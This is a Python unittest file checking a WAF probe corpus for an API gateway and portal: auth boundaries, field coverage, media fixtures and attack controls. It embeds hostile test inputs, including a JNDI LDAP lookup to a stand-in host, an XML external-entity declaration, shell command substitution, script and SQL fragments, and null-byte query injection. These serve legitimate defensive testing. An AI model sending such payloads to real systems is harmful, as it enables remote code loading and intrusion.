"""WAF probe evidence must preserve auth boundaries, attribution and secrecy."""
from collections import Counter
import base64
import hashlib
import io
from dataclasses import replace
from email import policy
from email.parser import BytesParser
from html.parser import HTMLParser
import importlib.util
import json
from pathlib import Path
import re
import subprocess
import sys
import tempfile
import copy
import unittest
import wave
import zipfile
import zlib
from xml.etree import ElementTree
from unittest.mock import patch
from urllib.parse import parse_qs, urlsplit

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
import waf_probe as probe


class WafProbeTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.routes = probe.load_routes()
        cls.cases = probe.build_corpus(cls.routes)

    def assert_media_signature(self, mime, body):
        signatures = {"application/pdf": b"%PDF-", "image/png": b"\x89PNG\r\n\x1a\n", "image/jpeg": b"\xff\xd8\xff", "image/tiff": b"II\x2a\x00", "image/bmp": b"BM", "audio/wav": b"RIFF", "text/html": b"<!DOCTYPE html>"}
        if mime in {"image/heif", "image/heic"}:
            self.assertEqual(body[4:8], b"ftyp")
            self.assertEqual(body[8:12], b"mif1" if mime == "image/heif" else b"heic")
        elif mime.startswith("application/vnd.openxmlformats-officedocument."):
            self.assertTrue(zipfile.is_zipfile(io.BytesIO(body)))
        else:
            self.assertTrue(body.startswith(signatures[mime]))

    def test_every_contract_operation_and_portal_handler_has_a_baseline(self):
        expected = {(route.target, route.method, route.path) for route in self.routes}
        actual = {(case.target, case.method, case.path) for case in self.cases if case.category == "baseline"}
        self.assertEqual(actual, expected)
        for path in (ROOT / "apps/gateway/apim/apis").glob("*.json"):
            contract = json.loads(path.read_text(encoding="utf-8"))
            for operation in contract["operations"]:
                self.assertIn(contract["name"] + ":" + operation["name"], {route.operation for route in self.routes})
        self.assertIn(("gateway", "POST", "/tools/pii-v1-mcp/mcp"), expected)
        self.assertIn(("gateway", "GET", "/auth/connections/browser/callback"), expected)
        self.assertIn(("portal", "GET", "/api/auth/callback/microsoft"), expected)
        self.assertIn(("portal", "PUT", "/api/api-keys/00000000-0000-4000-8000-000000000000/limits"), expected)
        self.assertIn(("portal", "GET", "/en/login"), expected)

    def test_corpus_is_large_unique_deterministic_and_includes_meaningful_families(self):
        self.assertGreater(len(self.cases), 1000)
        ids = [case.case_id for case in self.cases]
        self.assertEqual(len(ids), len(set(ids)))
        self.assertEqual(ids, [case.case_id for case in probe.build_corpus(self.routes)])
        categories = {case.category for case in self.cases}
        self.assertTrue({"content-sql-select", "content-html-script", "content-regex", "content-shell-source",
            "content-escaped-controls", "content-unicode-normalization", "content-opaque-base64", "json-array",
            "binary-mime", "size-boundary", "inspection-boundary", "websocket-upgrade", "multipart-audio",
            "attack-sqli", "attack-traversal", "attack-xss"}.issubset(categories))

    def test_typed_corpus_is_bounded_deterministic_and_keeps_auth_and_data_classes_separate(self):
        cases = probe.typed_data_probes(self.routes)
        self.assertLessEqual(len(cases), 128)
        self.assertEqual(len(cases), len({case.case_id for case in cases}))
        self.assertEqual(cases, probe.typed_data_probes(self.routes))
        self.assertEqual({case.data_type for case in cases}, probe.DATA_TYPES)
        for case in cases:
            with self.subTest(case=case.case_id):
                self.assertEqual(case.auth_mode, "anonymous")
                self.assertNotIn("api-key", {name.lower() for name, _ in case.headers})
                self.assertNotIn("authorization", {name.lower() for name, _ in case.headers})
                self.assertEqual(probe.metadata(case)["data_type"], case.data_type)
                for _, value in case.headers:
                    self.assertFalse(any(char in value for char in "\r\n\x00"))
                if case.body and dict(case.headers).get("Content-Type") == "application/json":
                    value = json.loads(case.body)
                    if "model" in value:
                        self.assertEqual(value["model"], probe.INVALID_MODEL)
                if case.data_type == "opaque-ticket":
                    self.assertIsNone(case.body)
                    self.assertNotIn("Content-Type", dict(case.headers))

    def test_large_history_is_real_utf8_json_with_tools_results_reasoning_and_http_log_text(self):
        for case in (case for case in probe.typed_data_probes(self.routes) if case.data_type == "conversation"):
            with self.subTest(path=case.path):
                self.assertEqual(len(case.body), 614400)
                self.assertLess(len(case.body.decode("utf-8")), len(case.body))
                value = json.loads(case.body)
                self.assertEqual(probe.json_bytes(value), case.body)
                self.assertEqual(value["model"], probe.INVALID_MODEL)
                history = value.get("input", value.get("messages"))
                self.assertGreaterEqual(len(history), 33)
                self.assertEqual(len(value["tools"]), 3)
                self.assertIn(b"SYNTHETIC_REQUEST_START", case.body[:16384])
                middle = case.body.index(b"SYNTHETIC_HISTORY_MIDDLE")
                self.assertTrue(len(case.body) // 3 < middle < len(case.body) * 2 // 3)
                self.assertIn(b"SYNTHETIC_REQUEST_END", case.body[-16384:])
                self.assertIn(b"HTTP/1.1 200 OK\\r\\nContent-Type", case.body)
                self.assertIn(b"SELECT id", case.body)
                self.assertIn(b"<script>", case.body)
                self.assertIn(b"$(printf synthetic)", case.body)
                if "input" in value:
                    self.assertFalse(value["store"])
                    reasoning = [item for item in history if item.get("type") == "reasoning"]
                    self.assertEqual(len(reasoning), 1)
                    self.assertEqual(reasoning[0]["summary"][0]["type"], "summary_text")
                    self.assertTrue(probe.OPAQUE_HEX_SIGNATURE.search(reasoning[0]["encrypted_content"]))
                    calls = {item["call_id"] for item in history if item.get("type") == "function_call"}
                    outputs = {item["call_id"] for item in history if item.get("type") == "function_call_output"}
                else:
                    calls = {call["id"] for item in history for call in item.get("tool_calls", [])}
                    outputs = {item["tool_call_id"] for item in history if item["role"] == "tool"}
                self.assertEqual(calls, outputs)
                self.assertEqual(len(calls), 8)

    def test_opaque_history_has_canonical_encoding_multiple_seeds_and_exact_hex_signature(self):
        cases = [case for case in probe.typed_data_probes(self.routes)
                 if case.payload_field == "input[].encrypted_content" and case.intent == "compatibility"]
        self.assertEqual(len(cases), 24)
        tokens = set()
        for case in cases:
            token = json.loads(case.body)["input"][0]["encrypted_content"]
            self.assertIn(len(token), (512, 4096, 16384))
            alphabet = "base64url" if case.data_type.endswith("base64url") else "base64"
            encode = base64.urlsafe_b64encode if alphabet == "base64url" else base64.b64encode
            decoded = base64.b64decode(token, altchars=b"-_" if alphabet == "base64url" else None, validate=True)
            self.assertEqual(encode(decoded).decode(), token)
            self.assertEqual(len(decoded), len(token) * 3 // 4)
            self.assertRegex(token, r"^[A-Za-z0-9_-]+$" if alphabet == "base64url" else r"^[A-Za-z0-9+/]+$")
            if "-hex-" in case.case_id:
                self.assertIsNotNone(re.search(r"(?i:(?:\A|[^\d])0x[a-f\d]{3,})", token))
            tokens.add(token)
        self.assertEqual(len(tokens), 24)
        self.assertEqual(probe.opaque_fixture("base64url", 512, 0), probe.opaque_fixture("base64url", 512, 0))
        with self.assertRaises(ValueError):
            probe.opaque_fixture("base64url", 127, 0)

    def test_typed_handles_and_tickets_use_local_contract_shapes_without_claiming_valid_crypto(self):
        cases = probe.typed_data_probes(self.routes)
        handles = [case for case in cases if case.payload_field == "handle" and case.intent == "compatibility"]
        self.assertEqual(len(handles), 24)
        for case in handles:
            value = json.loads(case.body)
            handle = value["handle"]
            if case.path.endswith("/stop"):
                self.assertEqual(set(value), {"handle"})
                self.assertTrue(handle.startswith("r1."))
                token = handle[3:]
            else:
                self.assertEqual(set(value), {"apiKeyId", "handle"})
                token = handle
            self.assertTrue(40 <= len(token) <= 15997)
            self.assertRegex(token, r"^[A-Za-z0-9_-]+$")
            self.assertGreater(len(base64.urlsafe_b64decode(token)), 28)
        tickets = [case for case in cases if case.data_type == "opaque-ticket" and case.intent == "compatibility"]
        self.assertEqual(len(tickets), 12)
        self.assertEqual(len({case.path for case in tickets}), 3)
        for case in tickets:
            name, ticket = next((name, value) for name, value in case.headers if name.startswith("X-Core-"))
            self.assertIn(name, ("X-Core-Document-Ticket", "X-Core-Call-Ticket"))
            self.assertLessEqual(len(ticket), 4096)
            payload, mac = ticket.split(".")
            self.assertTrue(json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))["synthetic"])
            self.assertEqual(len(mac), 43)
            decoded = base64.urlsafe_b64decode(mac + "=")
            self.assertEqual(len(decoded), 32)
            self.assertEqual(base64.urlsafe_b64encode(decoded).decode().rstrip("="), mac)
            if "-hex-" in case.case_id:
                self.assertIsNotNone(probe.OPAQUE_HEX_SIGNATURE.search(ticket))
            if case.path.endswith("/observer/"):
                self.assertEqual(case.query, (("call_id", probe.PARAMETER_VALUES["callId"]),))

    def test_typed_media_are_actual_png_pdf_and_pcm_wav_containers(self):
        cases = probe.typed_data_probes(self.routes)
        fixtures = []
        for case in cases:
            if case.data_type not in {"media-base64", "media-data-url", "media-binary"}:
                continue
            if case.data_type == "media-binary":
                fixtures.append((dict(case.headers)["Content-Type"], case.body))
                continue
            value = json.loads(case.body)
            if "input_image" in value:
                fields = [value[name] for name in ("input_image", "input_image_2") if name in value]
            else:
                part = value.get("input", value.get("messages"))[0]["content"][1]
                fields = [part.get("image_url", part.get("file_data", part.get("input_audio", part.get("file"))))]
                fields = [field.get("url", field.get("data", field.get("file_data"))) if isinstance(field, dict) else field for field in fields]
            for field in fields:
                mime, encoded = field.split(",", 1) if field.startswith("data:") else ("audio/wav" if case.payload_field.endswith("input_audio.data") else "image/png", field)
                fixtures.append((mime.removeprefix("data:").removesuffix(";base64"), base64.b64decode(encoded, validate=True)))
        self.assertEqual(len(fixtures), 10)
        for mime, content in fixtures:
            if mime == "audio/wav":
                with wave.open(io.BytesIO(content), "rb") as audio:
                    self.assertEqual((audio.getnchannels(), audio.getsampwidth(), audio.getframerate()), (1, 2, 16000))
                    self.assertEqual(len(audio.readframes(160)), 320)
            elif mime == "application/pdf":
                self.assertTrue(content.startswith(b"%PDF-1.4"))
                xref = int(content.rsplit(b"startxref\n", 1)[1].splitlines()[0])
                self.assertTrue(content[xref:].startswith(b"xref\n0 6\n"))
                self.assertTrue(content.endswith(b"%%EOF\n"))
            else:
                self.assertEqual(mime, "image/png")
                self.assertTrue(content.startswith(b"\x89PNG\r\n\x1a\n"))
                offset = 8
                while offset < len(content):
                    length = int.from_bytes(content[offset:offset + 4], "big")
                    chunk = content[offset + 4:offset + 8 + length]
                    self.assertEqual(zlib.crc32(chunk) & 0xffffffff, int.from_bytes(content[offset + 8 + length:offset + 12 + length], "big"))
                    offset += length + 12
                self.assertEqual(offset, len(content))

    def test_all_manifest_selectors_have_actual_offline_field_coverage_separate_from_waf_extraction(self):
        manifest = json.loads((ROOT / "apps/gateway/waf-data-exclusions.json").read_text())
        cases = self.cases + probe.ai_coding_probes(self.routes) + probe.jndi_field_probes(self.routes)
        coverage = probe.exclusion_coverage(cases, manifest)
        self.assertEqual(len(coverage), sum(len(profile["exclusions"]) for profile in manifest["profiles"]))
        # The legacy exact Portal state selector remains included for backward
        # coverage, but today's Portal accepts an object root, not scalar state.
        legacy_only = {("p-decision", "state")}
        required = [row for row in coverage if (row["profile"], row["selector"]) not in legacy_only]
        self.assertTrue(all(row["offline_field_present"] for row in required),
                        [(row["profile"], row["selector"]) for row in required if not row["offline_field_present"]])
        self.assertTrue(all(not row["waf_extraction_verified"] for row in coverage))
        self.assertTrue(all(row["case_ids"] and row["channels"] for row in required))
        self.assertTrue(any("header" in row["channels"] for row in coverage))
        self.assertTrue(any("multipart" in row["channels"] for row in coverage))
        route = next(route for route in self.routes if route.path == "/models/openai/v1/responses")
        false_label = probe._probe(route, "false-coverage-label", "test", body=probe.json_bytes({"model": probe.INVALID_MODEL}),
            headers=[("Content-Type", "application/json")], payload_field="input[].encrypted_content")
        rows = probe.exclusion_coverage([false_label], manifest)
        self.assertFalse(any(row["offline_field_present"] for row in rows))

    def test_field_coverage_keeps_prefix_neighbors_headers_cookies_and_non_json_separate(self):
        route = next(route for route in self.routes if route.path == "/models/openai/v1/responses")
        selectors = [("RequestArgValues", "StartsWith", "input.arguments."),
                     ("RequestArgKeys", "StartsWith", "input.arguments."),
                     ("RequestArgValues", "StartsWith", "input.argumentsExtra."),
                     ("RequestHeaderValues", "Equals", "X-Core-Synthetic"),
                     ("RequestCookieValues", "Equals", "synthetic_session")]
        manifest = {"profiles": [{"name": "synthetic", "scope": "gateway", "paths": [route.path],
            "exclusions": [dict(zip(("matchVariable", "selectorMatchOperator", "selector"), fields)) for fields in selectors]}]}
        case = probe._probe(route, "synthetic-field-coverage", "test", body=probe.json_bytes({
            "input": [{"arguments": {"query": "synthetic"}}]}), headers=[("Content-Type", "application/json"),
            ("x-core-synthetic", "synthetic"), ("Cookie", "synthetic_session=synthetic; other=other")])
        rows = probe.exclusion_coverage([case], manifest)
        self.assertEqual([row["offline_field_present"] for row in rows], [True, True, False, True, True])
        self.assertEqual(rows[3]["channels"], ["header"])
        self.assertEqual(rows[4]["channels"], ["cookie"])
        self.assertNotIn("synthetic_session=", json.dumps(rows))
        malformed = replace(case, body=b"p" * 614400, headers=(("Content-Type", "application/json"),),
                            payload_field="input[].arguments.query")
        self.assertFalse(any(row["offline_field_present"] for row in probe.exclusion_coverage([malformed], manifest)))

    def test_typed_opaque_controls_move_the_signature_out_of_the_approved_field(self):
        cases = probe.typed_data_probes(self.routes)
        sibling = next(case for case in cases if "typed-reasoning-sibling-" in case.case_id)
        item = json.loads(sibling.body)["input"][0]
        self.assertIsNotNone(probe.OPAQUE_HEX_SIGNATURE.search(item["encrypted_content_extra"]))
        self.assertNotEqual(item["encrypted_content_extra"], item["encrypted_content"])
        self.assertEqual(sibling.intent, "attack_control")
        for case in cases:
            if "typed-" not in case.case_id:
                continue
            if case.payload_field and case.payload_field.startswith("query:"):
                self.assertEqual(case.intent, "validation")
                self.assertTrue(any(probe.OPAQUE_HEX_SIGNATURE.search(value) for _, value in case.query))
            if case.intent == "attack_control":
                self.assertTrue("sibling" in case.case_id or "header" in case.case_id or "neighbor" in case.case_id)

    def test_deployment_routes_use_every_model_in_the_canonical_allowlist(self):
        for path in (ROOT / "apps/gateway/apim/apis").glob("*.json"):
            api = json.loads(path.read_text(encoding="utf-8"))
            for operation in api["operations"]:
                if "{deployment}" not in operation["urlTemplate"]:
                    continue
                constraint = api["authorization"]["operationConstraints"][operation["name"]]
                actual = {route.path for route in self.routes if route.operation == api["name"] + ":" + operation["name"]}
                expected = {"/" + api["path"] + operation["urlTemplate"].replace("{deployment}", model) for model in constraint["allowedModels"]}
                self.assertEqual(actual, expected)
                self.assertFalse(any("invalid-model" in route for route in actual))

    def test_exclusion_boundaries_keep_control_inputs_and_neighboring_paths_anonymous(self):
        controls = probe.boundary_controls(self.routes)
        self.assertGreater(len(controls), 100)
        self.assertLess(len(controls), 350)
        attacks = [case for case in controls if case.intent == "attack_control"]
        for case in controls:
            self.assertEqual(case.auth_mode, "anonymous")
            self.assertEqual(case.method, "POST")
        routes = {(case.target, case.path) for case in controls if case.category == "control-field-model"}
        for target, path in routes:
            with self.subTest(target=target, path=path):
                categories = {case.category for case in attacks if case.target == target and case.path == path}
                self.assertTrue({"control-field-model", "control-field-unknown", "control-header", "control-query"}.issubset(categories))
                self.assertTrue(any(case.target == target and case.path == path + "/neighbor" and case.category == "control-neighbor-path" for case in attacks))
        for case in controls:
            if case.category == "data-query-name-collision":
                self.assertEqual(case.intent, "validation")
                self.assertEqual(len(case.query), 1)
                self.assertEqual(case.query[0][1], probe.CONTROL_SQL)
        query_cases = [case for case in controls if case.path == "/models/openai/v1/chat/completions" and case.category == "data-query-name-collision"]
        self.assertTrue({"messages", "content", "tools", "arguments"}.issubset({case.query[0][0] for case in query_cases}))
        model_case = next(case for case in controls if case.path == "/models/openai/v1/chat/completions" and case.category == "control-field-model")
        value = json.loads(model_case.body)
        self.assertEqual(value["model"], probe.CONTROL_SQL)
        self.assertEqual(value["messages"][0]["content"], "Synthetic exclusion boundary baseline")
        header_case = next(case for case in controls if case.path == model_case.path and case.category == "control-header")
        self.assertEqual(dict(header_case.headers)["Referer"], probe.CONTROL_REFERER_XSS)
        self.assertNotEqual(json.loads(header_case.body)["model"], probe.CONTROL_SQL)
        result = probe.classify_response(403, {}, b"403 Forbidden Microsoft-Azure-Application-Gateway/v2", intent="attack_control")
        self.assertTrue(result["attack_block_evidence"])

    def test_every_declared_binary_media_type_has_a_signature_fixture(self):
        for route in self.routes:
            if route.body_format != "binary":
                continue
            for mime in route.content_types:
                with self.subTest(route=route.path, mime=mime):
                    case = next(case for case in self.cases if case.path == route.path and case.category == "binary-mime" and dict(case.headers)["Content-Type"] == mime)
                    self.assert_media_signature(mime, case.body)
                    self.assertEqual(case.intent, "compatibility")
        multipart = [case for case in self.cases if case.path == "/api/tools/documents" and case.category == "multipart-mime"]
        document_contract = next(route for route in self.routes if route.constraint.get("kind") == "documentAnalysis")
        self.assertEqual(set(document_contract.content_types), {"application/pdf", "image/jpeg", "image/png", "image/tiff", "image/bmp", "image/heif", "image/heic", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "application/vnd.openxmlformats-officedocument.presentationml.presentation", "text/html"})
        self.assertEqual(len(multipart), len(document_contract.content_types))
        for mime in document_contract.content_types:
            case = next(case for case in multipart if ("Content-Type: " + mime).encode() in case.body)
            message = BytesParser(policy=policy.default).parsebytes(b"MIME-Version: 1.0\r\nContent-Type: " + dict(case.headers)["Content-Type"].encode() + b"\r\n\r\n" + case.body)
            part = next(part for part in message.iter_parts() if part.get_param("name", header="content-disposition") == "file")
            self.assertEqual(part.get_content_type(), mime)
            expected_extension = {"image/heif": "heif", "image/heic": "heic", "text/html": "html", "application/vnd.openxmlformats-officedocument.wordprocessingml.document": "docx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet": "xlsx", "application/vnd.openxmlformats-officedocument.presentationml.presentation": "pptx"}.get(mime)
            if expected_extension:
                self.assertEqual(part.get_filename(), "probe." + expected_extension)
            self.assert_media_signature(mime, part.get_payload(decode=True))

    def test_heif_and_heic_fixtures_have_consistent_distinct_file_type_boxes(self):
        text = "Independent synthetic HEIF metadata 日本語🙂"
        for mime, brand in (("image/heif", b"mif1"), ("image/heic", b"heic")):
            with self.subTest(mime=mime):
                data = probe._binary_fixture(mime, text)
                boxes = []; offset = 0
                while offset < len(data):
                    size = int.from_bytes(data[offset:offset + 4], "big")
                    self.assertGreaterEqual(size, 8)
                    self.assertLessEqual(offset + size, len(data))
                    boxes.append((data[offset + 4:offset + 8], data[offset + 8:offset + size]))
                    offset += size
                self.assertEqual(offset, len(data))
                self.assertEqual([kind for kind, _ in boxes], [b"ftyp", b"free"])
                self.assertEqual(boxes[0][1][:4], brand)
                self.assertEqual(boxes[0][1][4:8], b"\x00\x00\x00\x00")
                compatible = boxes[0][1][8:]
                self.assertEqual(len(compatible) % 4, 0)
                self.assertIn(b"mif1", [compatible[i:i + 4] for i in range(0, len(compatible), 4)])
                self.assertEqual(boxes[1][1].decode("utf-8"), text)
                self.assertEqual(data, probe._binary_fixture(mime, text))

    def test_ooxml_fixtures_are_parseable_deterministic_packages_with_synthetic_text(self):
        text = 'Independent synthetic <&> "文書" 🙂\nsecond line'
        packages = {
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document": ("word/document.xml", "word/document.xml", "http://schemas.openxmlformats.org/wordprocessingml/2006/main"),
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet": ("xl/workbook.xml", "xl/worksheets/sheet1.xml", "http://schemas.openxmlformats.org/spreadsheetml/2006/main"),
            "application/vnd.openxmlformats-officedocument.presentationml.presentation": ("ppt/presentation.xml", "ppt/slides/slide1.xml", "http://schemas.openxmlformats.org/drawingml/2006/main"),
        }
        for mime, (main, content_part, namespace) in packages.items():
            with self.subTest(mime=mime):
                data = probe._binary_fixture(mime, text)
                self.assertEqual(data, probe._binary_fixture(mime, text))
                with zipfile.ZipFile(io.BytesIO(data)) as archive:
                    self.assertIsNone(archive.testzip())
                    self.assertEqual(archive.namelist(), sorted(archive.namelist()))
                    self.assertIn("[Content_Types].xml", archive.namelist())
                    self.assertIn("_rels/.rels", archive.namelist())
                    for info in archive.infolist():
                        self.assertEqual(info.date_time, (1980, 1, 1, 0, 0, 0))
                        self.assertFalse(info.filename.startswith("/"))
                        self.assertNotIn("..", info.filename.split("/"))
                        ElementTree.fromstring(archive.read(info.filename))
                    types = ElementTree.fromstring(archive.read("[Content_Types].xml"))
                    self.assertIn(("/" + main, mime + ".main+xml"), {(value.get("PartName"), value.get("ContentType")) for value in types if value.tag.endswith("Override")})
                    relationships = ElementTree.fromstring(archive.read("_rels/.rels"))
                    self.assertEqual(len(relationships), 1)
                    self.assertEqual(relationships[0].get("Target"), main)
                    self.assertEqual(relationships[0].get("Type"), "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument")
                    content = ElementTree.fromstring(archive.read(content_part))
                    self.assertEqual("".join(element.text or "" for element in content.iter("{" + namespace + "}t")), text)

    def test_html_fixture_is_utf8_and_keeps_source_text_out_of_markup(self):
        class Document(HTMLParser):
            def __init__(self):
                super().__init__(convert_charrefs=True)
                self.tags = []; self.declarations = []; self.paragraph = []; self.in_paragraph = False; self.charset = None
            def handle_decl(self, decl): self.declarations.append(decl.lower())
            def handle_starttag(self, tag, attrs):
                self.tags.append(tag)
                if tag == "p": self.in_paragraph = True
                if tag == "meta": self.charset = dict(attrs).get("charset")
            def handle_endtag(self, tag):
                if tag == "p": self.in_paragraph = False
            def handle_data(self, data):
                if self.in_paragraph: self.paragraph.append(data)
        text = 'Synthetic <script>literal source</script> & "日本語🙂"'
        data = probe._binary_fixture("text/html", text)
        document = Document(); document.feed(data.decode("utf-8", errors="strict")); document.close()
        self.assertEqual(document.declarations, ["doctype html"])
        self.assertEqual(document.charset, "utf-8")
        self.assertNotIn("script", document.tags)
        self.assertEqual("".join(document.paragraph), text)

    def test_real_content_fields_are_exercised_one_at_a_time(self):
        by_path = {}
        for case in self.cases:
            by_path.setdefault(case.path, set()).add(case.payload_field)
        self.assertIn("message", by_path["/api/models/generate"])
        self.assertIn("texts[]", by_path["/api/models/embeddings"])
        self.assertIn("texts[]", by_path["/models/cohere/v1/embed"])
        self.assertTrue({"state.message", "questions.*.instructions", "questions.*.criteria.*", "questions.*.criteria[]"}.issubset(by_path["/models/microsoft-decision/v1/systemone"]))
        self.assertIn("messages[].tool_calls[].function.arguments", by_path["/models/openai/v1/chat/completions"])
        self.assertIn("instructions", by_path["/models/openai/v1/responses"])
        self.assertIn("input[].output", by_path["/models/openai/v1/responses"])
        self.assertIn("params.arguments.text", by_path["/tools/pii-v1-mcp/mcp"])
        for case in self.cases:
            if case.payload_field == "message":
                value = json.loads(case.body)
                self.assertIn("message", value)
                self.assertNotIn("prompt", value)
                self.assertNotIn("input", value)

    def test_extended_generated_fields_are_anonymous_and_separately_selectable(self):
        extended = probe.extended_content(self.routes)
        self.assertGreaterEqual(len(extended), 400)
        self.assertLessEqual(len(extended), 800)
        for case in extended:
            self.assertTrue(case.category.startswith("extended-content-"))
            self.assertEqual(case.auth_mode, "anonymous")
            portal_invalid_state = case.target == "portal" and case.path == "/api/models/decision" and (
                "state-scalar" in case.category or "state-array" in case.category)
            self.assertEqual(case.intent, "validation" if portal_invalid_state else "compatibility")
            self.assertIsNotNone(case.payload_field)
        fields = {case.payload_field for case in extended}
        self.assertTrue({"response_format.json_schema.schema.properties.value.pattern",
            "response_format.json_schema.schema.properties.value.enum[]",
            "response_format.json_schema.schema.properties.value.default",
            "response_format.json_schema.schema.properties.value.examples[]",
            "keys:response_format.json_schema.schema.properties", "keys:tools[].parameters.properties",
            "keys:text.format.schema.properties", "input[].arguments", "input[].encrypted_content",
            "messages[].content[].image_url.url", "messages[].content[].input_audio.data",
            "input[].content[].file_data", "input.text", "keys:state", "state", "state[]"}.issubset(fields))
        self.assertTrue(any(".$defs.outer.$defs.inner." in field for field in fields))
        categories = {case.category for case in extended}
        self.assertEqual({case.case_id for case in self.cases if case.category in categories}, {case.case_id for case in extended})

    def test_decision_question_and_criteria_names_vary_without_varying_values(self):
        cases = probe.decision_question_keys(self.routes)
        self.assertEqual(len(cases), len(probe.payloads()) * 4)
        expected_names = {text for _, text in probe.payloads()}
        for target in ("gateway", "portal"):
            questions = [case for case in cases if case.target == target and case.payload_field == "keys:questions"]
            criteria = [case for case in cases if case.target == target and case.payload_field == "keys:questions.q.criteria"]
            self.assertEqual({next(iter(json.loads(case.body)["questions"])) for case in questions}, expected_names)
            self.assertEqual({next(iter(json.loads(case.body)["questions"]["q"]["criteria"])) for case in criteria}, expected_names)
            for case in questions:
                value = next(iter(json.loads(case.body)["questions"].values()))
                self.assertEqual(value, {"type": "noul", "instructions": "Is this a code sample?"})
            for case in criteria:
                value = json.loads(case.body)["questions"]["q"]
                self.assertEqual(value["type"], "choice")
                self.assertEqual(value["instructions"], "Choose a label.")
                self.assertEqual(set(value["criteria"].values()), {"Synthetic choice", "Other choice"})
        for case in cases:
            self.assertEqual(case.category, "extended-content-decision-question-keys")
            self.assertEqual(case.auth_mode, "anonymous")
            self.assertEqual(case.intent, "compatibility")

    def test_raw_guard_is_separate_and_keeps_data_distinct_from_control_positions(self):
        guards = probe.raw_body_guard_controls(self.routes)
        self.assertGreater(len(guards), 100)
        self.assertEqual(len(guards), len({case.case_id for case in guards}))
        self.assertFalse({case.case_id for case in guards} & {case.case_id for case in self.cases})
        baselines = {dict(case.headers)["Content-Type"]: case.body for case in guards if case.category == "raw-guard-baseline"}
        self.assertEqual(set(baselines), {"application/ssml+xml", "audio/wav", "application/pdf"})
        for case in guards:
            with self.subTest(case=case.case_id):
                self.assertEqual(case.target, "gateway")
                self.assertEqual(case.method, "POST")
                self.assertEqual(case.auth_mode, "anonymous")
                self.assertNotIn("api-key", {name.lower() for name, _ in case.headers})
                self.assertNotIn("authorization", {name.lower() for name, _ in case.headers})
                for _, value in case.headers:
                    self.assertFalse(any(character in value for character in "\r\n\x00"))
                if case.category in {"raw-guard-baseline", "raw-guard-body-data"}:
                    self.assertEqual(case.intent, "compatibility")
                    self.assertFalse(case.query)
                    self.assertEqual([name for name, _ in case.headers], ["Content-Type"])
                elif case.category == "raw-guard-ssml-external-entity":
                    self.assertEqual(case.intent, "validation")
                    self.assertEqual(probe.expected_boundary(case), "application_reject")
                else:
                    self.assertEqual(case.intent, "attack_control")
                if case.category in {"raw-guard-query", "raw-guard-header", "raw-guard-cookie", "raw-guard-query-null", "raw-guard-casepath-query", "raw-guard-neighbor-query"}:
                    self.assertEqual(case.body, baselines[dict(case.headers)["Content-Type"]])
                if case.category == "raw-guard-header":
                    self.assertIn("X-Header", dict(case.headers))
                    self.assertFalse(case.query)
                    self.assertNotIn("Cookie", dict(case.headers))
                if case.category == "raw-guard-cookie":
                    self.assertTrue(dict(case.headers)["Cookie"].startswith("raw_guard="))
                    self.assertFalse(case.query)
                if case.category == "raw-guard-query-null":
                    url = probe.request_url("https://example.invalid", case)
                    self.assertIn("%00", url)
                    self.assertNotIn("\x00", url)
        self.assertEqual({case.category for case in guards if "/neighbor" in case.path}, {"raw-guard-neighbor-query", "raw-guard-neighbor-body"})
        with self.assertRaises(ValueError):
            probe.raw_body_guard_controls([route for route in self.routes if route.path != "/tools/documents/v1/analyze"])

    def test_raw_guard_attack_bodies_remain_valid_http_contract_fixtures(self):
        for case in probe.raw_body_guard_controls(self.routes):
            with self.subTest(case=case.case_id):
                mime = dict(case.headers)["Content-Type"]
                if mime == "application/ssml+xml":
                    root = ElementTree.fromstring(case.body)
                    self.assertEqual(root.tag, "{http://www.w3.org/2001/10/synthesis}speak")
                    self.assertIsNotNone(root.find("{http://www.w3.org/2001/10/synthesis}voice"))
                    if case.category == "raw-guard-ssml-external-entity":
                        self.assertIn(b'<!ENTITY raw_guard SYSTEM "https://example.invalid/', case.body)
                        self.assertNotIn(b"&raw_guard;", case.body)
                elif mime == "audio/wav":
                    self.assertEqual(int.from_bytes(case.body[4:8], "little"), len(case.body) - 8)
                    with wave.open(io.BytesIO(case.body), "rb") as audio:
                        self.assertEqual(audio.getnchannels(), 1)
                        self.assertEqual(audio.getsampwidth(), 2)
                        self.assertEqual(audio.getframerate(), 16000)
                        self.assertEqual(audio.getnframes(), 160)
                        self.assertEqual(len(audio.readframes(160)), 320)
                elif mime == "application/pdf":
                    self.assertTrue(case.body.startswith(b"%PDF-1.4"))
                    self.assertTrue(case.body.endswith(b"%%EOF\n"))
                    xref = int(case.body.rsplit(b"startxref\n", 1)[1].splitlines()[0])
                    self.assertTrue(case.body[xref:].startswith(b"xref\n0 6\n"))
                    entries = case.body[xref:].splitlines()[3:8]
                    self.assertEqual(len(entries), 5)
                    for number, entry in enumerate(entries, 1):
                        offset = int(entry.split()[0])
                        self.assertTrue(case.body[offset:].startswith(f"{number} 0 obj\n".encode()))
                else:
                    self.fail("unexpected raw guard content type")

    def test_standalone_jndi_fields_and_query_collisions_cover_real_variables(self):
        cases = probe.jndi_field_probes(self.routes)
        literal = "${jndi:ldap://waf-probe.invalid/synthetic}"
        self.assertEqual(len(cases), len({case.case_id for case in cases}))
        self.assertFalse({case.case_id for case in cases} & {case.case_id for case in self.cases})
        expected = set()
        for route in self.routes:
            if route.method != "POST":
                continue
            if route.body_format == "json":
                expected.update((route.target, route.path, field_name) for field_name, _ in probe._json_variants(route, literal) if field_name != "validation_canary")
            if route.target == "gateway" and route.body_format == "multipart":
                expected.add((route.target, route.path, "prompt"))
        expected.add(("portal", "/api/models/speech", "input.text"))
        data = [case for case in cases if case.category == "extended-content-jndi-all-fields"]
        collisions = [case for case in cases if case.category == "data-query-name-collision-jndi"]
        self.assertEqual({(case.target, case.path, case.payload_field) for case in data}, expected)
        expected.update((case.target, case.path, case.payload_field) for case in cases
                        if case.category == "extended-content-jndi-ai-history")
        self.assertEqual({(case.target, case.path, case.payload_field) for case in collisions}, expected)
        for case in cases:
            self.assertEqual(case.auth_mode, "anonymous")
